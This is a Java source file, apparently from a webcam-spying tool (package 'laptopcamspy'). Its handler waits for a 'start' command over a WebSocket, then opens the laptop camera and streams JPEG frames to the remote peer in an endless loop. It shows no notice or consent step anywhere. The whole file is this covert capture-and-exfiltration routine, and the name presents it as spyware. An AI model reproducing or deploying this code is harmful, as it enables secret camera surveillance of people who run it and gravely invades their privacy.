package com.widow.laptopcamspy.servicehandler;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import javax.imageio.ImageIO;

import org.bytedeco.javacpp.opencv_core.IplImage;
import org.bytedeco.javacv.FrameGrabber;
import org.bytedeco.javacv.FrameGrabber.Exception;
import org.bytedeco.javacv.VideoInputFrameGrabber;
import org.java_websocket.WebSocket;

public class GrabImageServiceHandler implements IServiceHandler {

	Thread t;
	FrameGrabber grabber = new VideoInputFrameGrabber(0);

	@Override
	public void handleService(final WebSocket webSocket, String message) {

		switch (message){
		case "start":;
		System.out.println("Starting...");
		t = new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					grabber.start();


					while(true){
						//Load image img1 as IplImage
						IplImage image = null;
						image = grabber.grab();


						//convert image to base64 string and send
						BufferedImage buffImage = image.getBufferedImage();
						ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

						ImageIO.write(buffImage, "jpg", outputStream);


						ByteBuffer byteBuff = ByteBuffer.wrap(outputStream.toByteArray());
//						System.out.println("sent "+ byteBuff.capacity()+ "bytes");
						webSocket.send(byteBuff);
					}
				} catch (Exception e) {
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}finally{
					try {
						grabber.stop();
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}	
				}
			}

		});
		t.start();
		break;
		case "stop":
			System.out.println("Stopping");
			t.stop(); //TODO: stop thread in an elegant fashion and not by a deprecated method
			break;
		}


	}
}
